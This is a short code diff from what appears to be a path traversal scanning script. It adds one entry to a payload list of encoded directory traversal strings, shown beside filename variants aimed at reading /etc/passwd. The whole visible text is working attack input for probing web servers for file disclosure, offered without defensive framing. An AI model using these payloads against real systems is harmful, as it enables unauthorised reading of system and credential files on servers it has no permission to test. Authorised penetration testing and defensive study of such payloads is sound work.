@@ -22,7 +22,7 @@ def Verif(response, url):
 	
 
 def main():
-	payloads = ["/","../../../","....//....//....//","..///////..///////..///////","..%5c..%5c..%5c","..%253f..%253f..%253f","..%c0%af..%c0%af..%c0%af","%252e%252e%252f%252e%252e%252f%252e%252e%252f","/var/www/images/../../../"]
+	payloads = ["/","../../","../../../","....//....//....//","..///////..///////..///////","..%5c..%5c..%5c","..%253f..%253f..%253f","..%c0%af..%c0%af..%c0%af","%252e%252e%252f%252e%252e%252f%252e%252e%252f","/var/www/images/../../../"]
 	files = ["etc/passwd","etc//passwd","etc///////passwd","etc%5cpasswd","etc%253fpasswd","etc%c0%afpasswd","etc%252fpasswd"]
 	nullbyte = []
 
